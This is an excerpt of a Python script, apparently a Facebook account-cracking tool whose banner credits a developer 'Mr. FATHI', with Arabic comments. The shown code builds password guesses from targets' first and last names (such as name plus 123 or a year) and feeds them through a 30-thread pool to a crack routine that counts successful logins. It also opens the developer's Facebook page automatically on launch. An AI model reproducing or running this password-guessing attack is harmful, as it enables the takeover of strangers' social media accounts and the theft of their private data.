...
# ✅ فتح صفحة المطور تلقائياً - تم الإضافة
try:
    import webbrowser
    fb_app = "fb://profile/61579773892166"
    fb_web = "https://www.facebook.com/profile.php?id=61579773892166"
    opened = webbrowser.open(fb_app)
    if not opened:
        webbrowser.open(fb_web)
    print('\033[1;92m[✓] Opening Developer Page...')
    time.sleep(2)
except:
    print('\033[1;91m[!] Please open Facebook manually')
...
def banner():
    print(f"""
      ...
      \033[1;37m--------------------------------------------
      \033[1;31m[\033[1;32m•\033[1;31m]\033[1;32m DEVELOPER :   Mr. FATHI
      \033[1;31m[\033[1;32m•\033[1;31m]\033[1;32m TOOLS     :   FILE   
      \033[1;31m[\033[1;32m•\033[1;31m]\033[1;32m GITHUB    :   Noscope-404
      \033[1;31m[\033[1;32m•\033[1;31m]\033[1;32m VERSION   :   1.1.2
      \033[1;31m[\033[1;32m•\033[1;31m]\033[1;32m WHATSAPP  :   +213794939364
      \033[1;37m--------------------------------------------\033[0m""")
...
def passwrd():
        ...
        with tred(max_workers=30) as pool:
                for yuzong in id2:
                        ...
                        if len(nmf.split(' ')) > 1:
                                last_name = nmf.split(' ')[1]
                        else:
                                last_name = frs  # إذا لم يكن هناك اسم عائلة، استخدم الاسم الأول
                        
                        pwv = []
                        
                        # ✅ إضافة كلمات المرور الجديدة المطلوبة فقط
                        if len(frs) >= 3:
                                # القائمة المطلوبة مع استبدال first و last بالقيم الفعلية
                                password_patterns = [
                                    'firstfirst', 'firstlast', 'first last', 'first first', 
                                    'last last', 'lastfirst', 'last first', 'Lastlast',
                                    'first 123', 'first123', 'first 1234', 'first1234',
                                    'first12345', 'first 12345', 'first123456', 'first 123456',
                                    'first2020', 'first2021', 'first2022', 'first2023',
                                    'firstlast2002', 'firstlast2001', 'firstlast2003', 'firstlast2000',
                                    'first2001', 'first2000', 'first2002', 'first2003',
                                    'first2004', 'first2005', 'first2006', 'first2007',
                                    'firstlast2007', 'firstlast2005', 'first@123', 'first@1234',
                                    'first@12345', 'first@123456', 'first 2021', 'first 2022'
                                ]
                                
                                for pattern in password_patterns:
                                        actual_pwd = pattern.replace('first', frs).replace('last', last_name)
                                        pwv.append(actual_pwd)
                        
                        # ✅ إضافة كلمات المرور اليدوية إذا طلب المستخدم
                        if 'ya' in pwpluss:
                                for xpwd in pwnya:
                                        pwv.append(xpwd)
...
def crack(idf,pwv):
        ...
        sys.stdout.write(f"\r{bo} [FATHI-XD] {h}{loop}|{len(id)} | OK:-{h}{ok} ")
        sys.stdout.flush()
